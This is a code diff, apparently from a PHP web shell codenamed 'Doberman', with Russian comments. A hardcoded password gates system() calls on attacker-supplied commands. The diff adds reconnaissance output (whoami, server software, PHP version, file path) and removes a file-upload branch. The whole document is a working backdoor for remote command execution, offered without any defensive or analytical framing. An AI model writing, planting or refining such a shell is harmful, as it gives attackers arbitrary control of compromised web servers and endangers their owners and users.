@@ -3,11 +3,17 @@
 $key = "d0b3rm@n";
 if(isset($_REQUEST['key']) && $_REQUEST['key'] === $key) {
     if(isset($_REQUEST['cmd'])) {
+        // Диагностическая информация
+        echo "Server: " . $_SERVER['SERVER_SOFTWARE'] . "\n";
+        echo "PHP: " . phpversion() . "\n";
+        echo "User: " . exec('whoami') . "\n";
+        echo "CWD: " . getcwd() . "\n";
+        echo "File: " . __FILE__ . "\n";
+        echo "Size: " . filesize(__FILE__) . " bytes\n";
+        
+        // Выполнение команды
         system($_REQUEST['cmd']);
-        echo "\n@Doberman_Command_Executed"; // Добавляем маркер успешного выполнения
-    } elseif(isset($_FILES['f']['name'])) {
-        move_uploaded_file($_FILES['f']['tmp_name'], getcwd()."/".$_FILES['f']['name']);
-        echo "@Doberman_File_Uploaded";
+        echo "\n@Doberman_Success"; // Маркер успеха
     }
 } else {
     echo "Access Denied";
